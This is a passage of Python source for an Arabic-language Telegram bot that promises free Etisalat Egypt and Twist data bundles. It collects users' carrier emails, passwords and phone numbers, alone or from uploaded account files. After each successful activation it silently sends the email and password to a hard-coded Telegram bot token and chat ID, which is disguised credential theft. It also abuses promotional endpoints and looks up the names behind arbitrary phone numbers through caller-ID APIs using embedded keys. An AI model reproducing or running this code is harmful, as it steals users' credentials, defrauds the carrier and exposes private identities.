        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أرسل ملف الحسابات (txt أو csv):")
        bot.register_next_step_handler(call.message, process_file_snap)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_file_snap(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    with open("accounts.txt", "wb") as new_file:
        new_file.write(downloaded_file)
    with open("accounts.txt", "r") as f:
        for line in f:
            email, password, number = line.strip().split(',')
            process_account(email, password, number, message.chat.id)

def process_account(email, password, number, chat_id):
        num = number[+1:]
        code = email + ":" + password
        ccode = code.encode("ascii")
        base64_bytes = base64.b64encode(ccode)
        auth = base64_bytes.decode("ascii")
        xauth = "Basic" + " " + auth
        
        urllog = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        headerslog = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": xauth,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        
        datalog = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
        log = requests.post(urllog, headers=headerslog, data=datalog)        
        if "true" in log.text:
            st = log.headers["Set-Cookie"]
            ck = st.split(";")[0] 
            br = log.headers["auth"]
            url = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/offersV3?req=<dialAndLanguageRequest><subscriberNumber>%s</subscriberNumber><language>1</language></dialAndLanguageRequest>" % (num)
            headers = {
                'applicationVersion': "2",
                'Content-Type': "text/xml",
                'applicationName': "MAB",
                'Accept': "text/xml",
                'Language': "ar",
                'APP-BuildNumber': "10459",
                'APP-Version': "29.9.0",
                'OS-Type': "Android",
                'OS-Version': "11",
                'APP-STORE': "GOOGLE",
                'auth': "Bearer " + br,
                'Host': "mab.etisalat.com.eg:11003",
                'Is-Corporate': "false",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip",
                'User-Agent': "okhttp/5.0.0-alpha.11",
                'Cookie': ck
            }

            response = requests.get(url, headers=headers)
        if "Offer_ID" in response.text:
            root = ET.fromstring(response.text)
            offer_id = None
            for category in root.findall('.//mabCategory'):
                for product in category.findall('.//mabProduct'):
                    for parameter in product.findall('.//fulfilmentParameter'):
                        if parameter.find('name').text == 'Offer_ID':
                            offer_id = parameter.find('value').text
                            break
                    if offer_id is not None:
                        break
                if offer_id is not None:
                    break
            
            if offer_id:
                if "true" in log.text:
                    st = log.headers["Set-Cookie"]
                    ck = st.split(";")[0] 
                    br = log.headers["auth"]
                    urlsub = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/submitOrder"
                    headerssub = {
                        "applicationVersion": "2",
                        "applicationName": "MAB",
                        "Accept": "text/xml",
                        "Cookie": ck,
                        "Language": "ar",
                        "APP-BuildNumber": "964",
                        "APP-Version": "27.0.0",
                        "OS-Type": "Android",
                        "OS-Version": "12",
                        "APP-STORE": "GOOGLE",
                        "auth": "Bearer " + br,
                        "Is-Corporate": "false",
                        "Content-Type": "text/xml; charset=UTF-8",
                        "Content-Length": "1375",
                        "Host": "mab.etisalat.com.eg:11003",
                        "Connection": "Keep-Alive",
                        "User-Agent": "okhttp/5.0.0-alpha.11"
                    }
                    datasub = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><submitOrderRequest><mabOperation></mabOperation><msisdn>%s</msisdn><operation>ACTIVATE</operation><parameters><parameter><name>GIFT_FULLFILMENT_PARAMETERS</name><value>Offer_ID:%s;ACTIVATE:True;isRTIM:Y</value></parameter></parameters><productName>FAN_ZONE_HOURLY_BUNDLE</productName></submitOrderRequest>" % (num, offer_id)
                    subs = requests.post(urlsub, headers=headerssub, data=datasub).text
                    if "true" in subs:                    
                        bot.send_message(chat_id, text=f"️❤️‍🔥تم اضافة ساعتين انترنت❤️‍🔥{email}")
                        text = f"{email},{quote_plus(password)}"
                        tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text}"
                        i = requests.post(tlg)
                    else:
                        bot.send_message(chat_id, text="اتأكد من الرقم والباسورد")
        else:
            bot.send_message(chat_id, text=f"{email} فشل تسجيل الدخول")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

@bot.callback_query_handler(func=lambda call: call.data == 'soch')
def handle_etisalat_hours(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أدخل البريد الإلكتروني الخاص بك:")
        bot.register_next_step_handler(call.message, process_email_etisalat_soch)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)

def process_email_etisalat_soch(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "من فضلك أدخل كلمة المرور الخاصة بتطبيق اتصالات:")
    bot.register_next_step_handler(message, process_password_soch)
def process_password_soch(message):
    if message.text.lower() == "/start":
        return
    user_data[message.chat.id]['password'] = message.text
    bot.send_message(message.chat.id, "الرجاء إدخال رقم اتصالات المكون من 11 رقمًا.")
    bot.register_next_step_handler(message, process_number_soch)
def process_number_soch(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['number'] = message.text
        email = user_data[message.chat.id]['email']
        password = user_data[message.chat.id]['password']
        number = user_data[message.chat.id]['number']
        num = number[+1:]
        code = email + ":" + password
        ccode = code.encode("ascii")
        base64_bytes = base64.b64encode(ccode)
        auth = base64_bytes.decode("ascii")
        xauth = "Basic" + " " + auth        
        urllog = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        headerslog = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": xauth,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        
        datalog = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
        log = requests.post(urllog, headers=headerslog, data=datalog)
        
        if "true" in log.text:
            st = log.headers["Set-Cookie"]
            ck = st.split(";")[0] 
            br = log.headers["auth"]
            url = "https://mab.etisalat.com.eg:11003/Saytar/rest/zero11/submitOrder"

            payload = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><submitOrderRequest><mabOperation></mabOperation><msisdn>%s</msisdn><operation>ACTIVATE</operation><parameters><parameter><name>GIFT_FULLFILMENT_PARAMETERS</name><value>Offer_ID:20183;isRTIM:Y</value></parameter></parameters><productName>4G_DYNAMIC_OFFER</productName></submitOrderRequest>"%num

            headers = {
  'User-Agent': "okhttp/5.0.0-alpha.11",
  'Connection': "Keep-Alive",
  'Accept': "text/xml",
  'Accept-Encoding': "gzip",
  'applicationVersion': "2",
  'applicationName': "MAB",
  'Language': "ar",
  'APP-BuildNumber': "10550",
  'APP-Version': "31.0.0",
  'OS-Type': "Android",
  'OS-Version': "12",
  'APP-STORE': "GOOGLE",
  'auth': "Bearer" + br,
  'Is-Corporate': "false",
  'Content-Type': "text/xml; charset=UTF-8",
  'ADRUM_1': "isMobile:true",
  'ADRUM': "isAjax:true",
  'Cookie':ck
}

            response = requests.post(url, data=payload, headers=headers)
            if "true" in response.text:
            	bot.send_message(message.chat.id,text="تم طلب العرض انتظر حظك❤️‍🔥🚀")
            else:
            	bot.send_message(message.chat.id,text="الرقم غلط❌❌")

        else:
        	bot.send_message(message.chat.id,text="الايميل او الباسورد غلط❌❌")
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@bot.callback_query_handler(func=lambda call: call.data == 'soch3')
def handle_etisalat_hours(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أدخل البريد الإلكتروني الخاص بك:")
        bot.register_next_step_handler(call.message, process_email_etisalat_soch3)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)        
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_email_etisalat_soch3(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "من فضلك أدخل كلمة المرور الخاصة بتطبيق اتصالات:")
    bot.register_next_step_handler(message, process_password_soch3)
def process_password_soch3(message):
    if message.text.lower() == "/start":
        return
    user_data[message.chat.id]['password'] = message.text
    bot.send_message(message.chat.id, "الرجاء إدخال رقم اتصالات المكون من 11 رقمًا.")
    bot.register_next_step_handler(message, process_number_soch3)
def process_number_soch3(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['number'] = message.text
        email = user_data[message.chat.id]['email']
        password = user_data[message.chat.id]['password']
        number = user_data[message.chat.id]['number']
        num = number[+1:]
        code = email + ":" + password
        ccode = code.encode("ascii")
        base64_bytes = base64.b64encode(ccode)
        auth = base64_bytes.decode("ascii")
        xauth = "Basic" + " " + auth
        
        urllog = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        headerslog = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": xauth,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        
        datalog = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
        log = requests.post(urllog, headers=headerslog, data=datalog)        
        if "true" in log.text:
            st = log.headers["Set-Cookie"]
            ck = st.split(";")[0] 
            br = log.headers["auth"]
            url = "https://mab.etisalat.com.eg:11003/Saytar/rest/downloadAndGet/downloadFestivalSubmitOrder"
            payload = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><downloadAndGetSubmitOrderRequest><dial>%s</dial><operationId>REDEEM</operationId><productId>DOWNLOAD_GIFT_1_SOCIAL_UNITS</productId></downloadAndGetSubmitOrderRequest>"%num
            headers = {
  'User-Agent': "okhttp/5.0.0-alpha.11",
  'Connection': "Keep-Alive",
  'Accept': "text/xml",
  'Accept-Encoding': "gzip",
  'applicationVersion': "2",
  'applicationName': "MAB",
  'Language': "ar",
  'APP-BuildNumber': "10550",
  'APP-Version': "31.0.0",
  'OS-Type': "Android",
  'OS-Version': "12",
  'APP-STORE': "GOOGLE",
  'auth': "Bearer" + br,
  'Is-Corporate': "false",
  'Content-Type': "text/xml; charset=UTF-8",
  'ADRUM_1': "isMobile:true",
  'ADRUM': "isAjax:true",
  'Cookie':ck
}
            ren = requests.post(url, data=payload, headers=headers)
            if "true" in ren.text:
            	bot.send_message(message.chat.id,text="تم طلب العرض انتظر حظك❤️‍🔥🚀")
            else:
            	bot.send_message(message.chat.id,text="الرقم غلط❌❌")

        else:
        	bot.send_message(message.chat.id,text="الايميل او الباسورد غلط❌❌")
 #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
@bot.callback_query_handler(func=lambda call: call.data == 'soch4')
def handle_etisalat_hours(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="ادخل معلومات الحساب",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "من فضلك أدخل البريد الإلكتروني الخاص بك:")
        bot.register_next_step_handler(call.message, process_email_etisalat_soch4)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_email_etisalat_soch4(message):
    user_data[message.chat.id] = {'email': message.text}
    bot.send_message(message.chat.id, "من فضلك أدخل كلمة المرور الخاصة بتطبيق اتصالات:")
    bot.register_next_step_handler(message, process_password_soch4)
def process_password_soch4(message):
    if message.text.lower() == "/start":
        return
    user_data[message.chat.id]['password'] = message.text
    bot.send_message(message.chat.id, "الرجاء إدخال رقم اتصالات المكون من 11 رقمًا.")
    bot.register_next_step_handler(message, process_number_soch4)

def process_number_soch4(message):
    if message.chat.id in user_data:
        user_data[message.chat.id]['number'] = message.text
        email = user_data[message.chat.id]['email']
        password = user_data[message.chat.id]['password']
        number = user_data[message.chat.id]['number']
        num = number[+1:]
        code = email + ":" + password
        ccode = code.encode("ascii")
        base64_bytes = base64.b64encode(ccode)
        auth = base64_bytes.decode("ascii")
        xauth = "Basic" + " " + auth        
        urllog = "https://mab.etisalat.com.eg:11003/Saytar/rest/authentication/loginWithPlan"
        headerslog = {
            "applicationVersion": "2",
            "applicationName": "MAB",
            "Accept": "text/xml",
            "Authorization": xauth,
            "APP-BuildNumber": "964",
            "APP-Version": "27.0.0",
            "OS-Type": "Android",
            "OS-Version": "12",
            "APP-STORE": "GOOGLE",
            "Is-Corporate": "false",
            "Content-Type": "text/xml; charset=UTF-8",
            "Content-Length": "1375",
            "Host": "mab.etisalat.com.eg:11003",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11",
            "ADRUM_1": "isMobile:true",
            "ADRUM": "isAjax:true"
        }
        
        datalog = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><loginRequest><deviceId></deviceId><firstLoginAttempt>true</firstLoginAttempt><modelType></modelType><osVersion></osVersion><platform>Android</platform><udid></udid></loginRequest>"
        log = requests.post(urllog, headers=headerslog, data=datalog)      
        if "true" in log.text:
            st = log.headers["Set-Cookie"]
            ck = st.split(";")[0] 
            br = log.headers["auth"]
            url = "https://mab.etisalat.com.eg:11003/Saytar/rest/downloadAndGet/downloadFestivalSubmitOrder"
            payload = "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><downloadAndGetSubmitOrderRequest><dial>%s</dial><operationId>REDEEM</operationId><productId>DOWNLOAD_GIFT_2_STREAMING_UNITS</productId></downloadAndGetSubmitOrderRequest>"%num
            headers = {
  'User-Agent': "okhttp/5.0.0-alpha.11",
  'Connection': "Keep-Alive",
  'Accept': "text/xml",
  'Accept-Encoding': "gzip",
  'applicationVersion': "2",
  'applicationName': "MAB",
  'Language': "ar",
  'APP-BuildNumber': "10550",
  'APP-Version': "31.0.0",
  'OS-Type': "Android",
  'OS-Version': "12",
  'APP-STORE': "GOOGLE",
  'auth': "Bearer" + br,
  'Is-Corporate': "false",
  'Content-Type': "text/xml; charset=UTF-8",
  'ADRUM_1': "isMobile:true",
  'ADRUM': "isAjax:true",
  'Cookie':ck
}
            ren = requests.post(url, data=payload, headers=headers)       
            if "true" in ren.text:
            	bot.send_message(message.chat.id,text="تم طلب العرض انتظر حظك❤️‍🔥🚀")
            else:
            	bot.send_message(message.chat.id,text="الرقم غلط❌❌")

        else:
        	bot.send_message(message.chat.id,text="الايميل او الباسورد غلط❌❌")
 #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

@bot.callback_query_handler(func=lambda call: call.data == 'twist')
def handle_twist(call):
    user_id = call.from_user.id
    if is_subscribed(user_id):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        ok = types.InlineKeyboardButton('Back', callback_data='ok')
        markup.add(ok)
        bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="تاكد من المعلومات المدخله",
        reply_markup=markup
    )
        bot.send_message(call.message.chat.id, "مرحبًا! من فضلك أدخل رقم اتصالات الخاص بك: ")
        bot.register_next_step_handler(call.message, process_phone)
        
    else:
        markup = types.InlineKeyboardMarkup()
        btn4 = types.InlineKeyboardButton('اشتراك', url='https://t.me/abdelgaf777771')
        btn5 = types.InlineKeyboardButton('اشتراك', url='https://t.me/t_e_a_m_dark1')
        btn6 = types.InlineKeyboardButton('اشتراك', url='https://t.me/python_char_89')
        markup.add(btn4, btn5, btn6)     
        bot.send_message(call.message.chat.id, "يجب الاشتراك في قنوات البوت لاستخدام هذه الخدمة.\n\nبعد الاشتراك اضغط /start", reply_markup=markup)
def process_phone(message):
    phone_number = message.text
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    payload = {
      "dial": f"2{phone_number}"
    }
    headers = {
      'User-Agent': random_user_agent,
      'Accept': "application/json",
      'Accept-Encoding': "gzip",
      'Content-Type': "application/json",
      'tgdeviceid': "",
      'app_version': "10.9.50",
      'device_token': "",
      'appversion': "10.9.50",
      'channel': "mobileapp",
      'access-token': "",
      'platform': "android",
      'tg-token': "",
      'accept-language': "ar",
      'tg-refresh-token': "",
      'device_id': "Failed to get deviceId."
    }
    
    response = requests.post(url, data=json.dumps(payload), headers=headers)   
    if "SUCCESS" in response.text:
        bot.send_message(message.chat.id, f"تم إرسال الكود إلى الرقم: {phone_number}. من فضلك ادخل الكود: ")
        bot.register_next_step_handler(message, lambda msg: process_code(msg, phone_number))
    else:
        bot.send_message(message.chat.id, "عفوا حدث خطأ حاول مرة أخرى.")
def process_code(message, phone_number):
    num = phone_number[1:]  # تعديل هنا
    verification_code = message.text
    url = "https://api.twistmena.com/music/Dlogin/verify"
    payload = {
      "dial": f"2{phone_number}",
      "verifyCode": verification_code
    }
    headers = {
      'User-Agent': random_user_agent,
      'Accept': "application/json",
      'Accept-Encoding': "gzip",
      'Content-Type': "application/json",
      'tgdeviceid': "",
      'app_version': "10.9.50",
      'device_token': "",
      'appversion': "10.9.50",
      'channel': "mobileapp",
      'access-token': "",
      'platform': "android",
      'tg-token': "",
      'accept-language': "ar",
      'tg-refresh-token': "",
      'device_id': "Failed to get deviceId."
    } 
    response = requests.post(url, data=json.dumps(payload), headers=headers)    
    if "accessToken" in response.text:
        r = response.json()
        token = r.get("token")
        accessToken = r.get("accessToken")
        tgToken = r.get("tgToken")
        tgRefreshToken = r.get("tgRefreshToken")
        voucher = f"TWIST{num}"
        redeem_url = "https://api.twistmena.com/music/redeem"
        redeem_headers = {
          'User-Agent': random_user_agent,
          'Accept': "application/json",
          'Accept-Encoding': "gzip",
          'tgdeviceid': "19332974",
          'app_version': "10.9.50",
          'device_token': "",
          'appversion': "10.9.50",
          'channel': "mobileapp",
          'authorization': f"Bearer {token}",
          'content-type': "application/json",
          'access-token': accessToken,
          'platform': "android",
          'tg-token': tgToken,
          'voucher': voucher,
          'accept-language': "ar",
          'tg-refresh-token': tgRefreshToken,
          'device_id': "Failed to get deviceId.",
          'msisdn': phone_number
        }
        
        redeem_response = requests.post(redeem_url, headers=redeem_headers)      
        if "200" in redeem_response.text:
            bot.send_message(message.chat.id, f"تم إضافة 500 ميجا لخطك بنجاح✅")
            user_id = message.from_user.id
            textt = f"@{message.from_user.username} (ID: {user_id})"
            text = f"{phone_number}\nتم التعيل\n\n{textt} "
            tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text}"
            i = requests.post(tlg)
        elif "400" in redeem_response.text:
            bot.send_message(message.chat.id, f"أنت بالفعل مشترك في العرض.")
            user_id = message.from_user.id
            textt = f"@{message.from_user.username} (ID: {user_id})"
            text = f"{phone_number}\nلم يتم التفعيل\n\n{textt} "
            tlg = f"https://api.telegram.org/bot5026389727:AAHWmFs5iiSf-eAynE8nX3Z9pXfKrSF5t-8/sendMessage?chat_id=1180925062&text={text}"
            i = requests.post(tlg)
        else:
            bot.send_message(message.chat.id, "حدث خطأ حاول مرة أخرى.")
    else:
        bot.send_message(message.chat.id, "فشل التحقق من الكود، حاول مرة أخرى.")
#$$$$$$$$$$$$$$$$$$$$$$$$$$£$$$$$$$$      

@bot.callback_query_handler(func=lambda call: call.data == 'other')
def handle_free(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup()
    btn100 = types.InlineKeyboardButton('Sreach Number  🔍', callback_data='search')
    #sp = types.InlineKeyboardButton('Spam  📞', callback_data='spam')
    gd = types.InlineKeyboardButton('جدول المباريات', callback_data='gd')
    markup.add(btn100)
    #markup.add(sp)
    markup.add(gd)
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="اختار نوع الخدمه✨🌧",
        reply_markup=markup
    )
    
##################################    
@bot.callback_query_handler(func=lambda call: call.data == 'search')
def handle_other(call):
	chat_id = call.message.chat.id
	markup = types.InlineKeyboardMarkup()
	ok = types.InlineKeyboardButton('Back', callback_data='ok')
	markup.add(ok)
	bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text="تابع......",
        reply_markup=markup
    )
	bot.send_message(call.message.chat.id, "ادخل الرقم للبحث:")
	
	bot.register_next_step_handler(call.message, process_phone_number_search)
gg = 0

def process_phone_number_search(message):
    global gg
    # استخراج الرقم من النص باستخدام regex
    phone_number = extract_phone_number(message.text)
    
    if not phone_number:
        bot.send_message(message.chat.id, "❌ لم يتم العثور على رقم هاتف صالح. يرجى المحاولة مرة أخرى.")
        return
    
    user_data[message.chat.id] = {'phone_number': phone_number}
    
    url = "https://s.callapp.com/callapp-server/csrch"
    params = {
        'cpn': f"+2{phone_number}",
        'myp': "+201026701026",
        'ibs': "0",
        'cid': "0",
        'tk': "0007824515",
        'cvc': "2204"
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.107 Mobile Safari/537.36",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
    }
    
    response = requests.get(url, params=params, headers=headers)
    pri = "Not Found Name"
    if "name" in response.text:
        try:
            pri = response.json().get("name", "Not Found Name")
        except Exception as e:
            print(f"Error parsing JSON: {e}")
    
    result_text = f"""╔═════════════════════
 [1] NAME         {pri}
╚═══════════
 By:- @Abdo_1907_A3 
╚═════════════════════"""
    
    se = bot.send_message(message.chat.id, result_text)
    
    # الطلب الثاني
    url = "https://api.eyecon-app.com/app/getnames.jsp"
    params = {
        'cli': f"2{phone_number}",
        'lang': "en",
        'is_callerid': "true",
        'is_ic': "true",
        'cv': "vc_538_vn_4.0.538_a",
        'requestApi': "URLconnection",
        'source': "SocialIdOptionSelectorDialog",
        'is_search': "true"
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'e-auth-v': "e1",
        'e-auth': "4c4c30e8-18c1-454f-8070-ef7d5079fa2c",
        'e-auth-c': "31",
        'e-auth-k': "PgdtSBeR0MumR7fO",
        'accept-charset': "UTF-8",
        'content-type': "application/x-www-form-urlencoded; charset=utf-8"
    }
    
    req = requests.get(url, params=params, headers=headers)
    
    names = []
    if "name" in req.text:
        try:
            data = req.json()
            for index, item in enumerate(data, start=2):
                gg += 1
                name = item.get("name", "Unknown")
                names.append(f"# [{index}] NAME :>   {name}")
                time.sleep(0.3)
        except Exception as e:
            print(f"Error parsing second request: {e}")
    
    names_string = "\n╚═══════════\n".join(names) if names else "No additional names found."
    
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="📩 أرسل رسالة عبر واتساب", url=f"https://wa.me/2{phone_number}")
    keyboard.add(button)
    
    final_result = f"""╔═════════════════════
#[1] NAME :>   {pri}
╚═══════════
{names_string}
╚═══════════
# By:- @Abdo_1907_A3 
╚═════════════════════"""
    
    for i in range(6):
        bot.edit_message_text(chat_id=message.chat.id, message_id=se.message_id, text="Load more" + "." * i)
        time.sleep(0.20)
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=se.message_id, text=final_result, reply_markup=keyboard)

# دالة لاستخراج الرقم المكون من 11 رقمًا
def extract_phone_number(text):
    # البحث عن سلسلة تحتوي على 11 رقمًا متتاليًا
    match = re.search(r'\b\d{11}\b', text)
    if match:
        return match.group()  # إرجاع الرقم الكامل
    return None

# التعامل مع زر البحث

@bot.callback_query_handler(func=lambda call: call.data == 'spam')
def handle_other(call):
	bot.send_message(call.message.chat.id, "روح للبوت دا\n\n@all_spam_55_bot")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
user_dataa = {}
def nam(comp_id):
    url = f"https://jdwalapp.com/wp-json/jmanager/v2/comp/{comp_id}"
    
    headers = {
        'User-Agent': "jdwelapp-android/5.1.7",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'x-requested-with': "jdwelapp-android",
        'x-os-type': "android",
        'x-app-version': "5.1.7",
        'x-user-cookie': "A8T!Dn@a16^UF1%!x5",
        'x-cdn-ud': "JADU-394622e9-237d-4000-9209-86e3e4dc2883"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200 and "title_ar" in response.text:
        return response.json()["comp"]["title_ar"]
    else:
        return "Unknown Competition"
    
import threading
from time import sleep

def loading_animation(chat_id, message_id, markup):
    """ وظيفة تعمل في Thread منفصل لتحديث الرسالة باللودينج """
    i = 0
    while loading:
        sleep(0.1)
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="Loading" + "." * (i % 9),
            reply_markup=None
        )
        i += 1

@bot.callback_query_handler(func=lambda call: call.data == 'gd')
def handle_gd(call):
    global loading  # متغير تحكم في اللودينج
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    
    # زر التحديث
    new_button1 = types.InlineKeyboardButton(text="Back", callback_data='ok')
    bbb1 = types.InlineKeyboardButton(text="مباريات الغد", callback_data='tom')
    bbb2 = types.InlineKeyboardButton(text="مباريات الامس", callback_data='ams')
    markup = types.InlineKeyboardMarkup()
    markup.add(bbb2,bbb1)
    markup.add(new_button1)
    
    # تشغيل اللودينج في Thread منفصل
    loading = True
    loading_thread = threading.Thread(target=loading_animation, args=(chat_id, message_id, markup))
    loading_thread.start()

    # جلب البيانات
    current_date = datetime.now().strftime("%Y-%m-%d")
    url = f"https://jdwalapp.com/wp-json/jmanager/v1/matches/date/{current_date}/all/1"
    
    headers = {
        'User-Agent': "jdwelapp-android/5.1.7",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'x-requested-with': "jdwelapp-android",
        'x-os-type': "android",
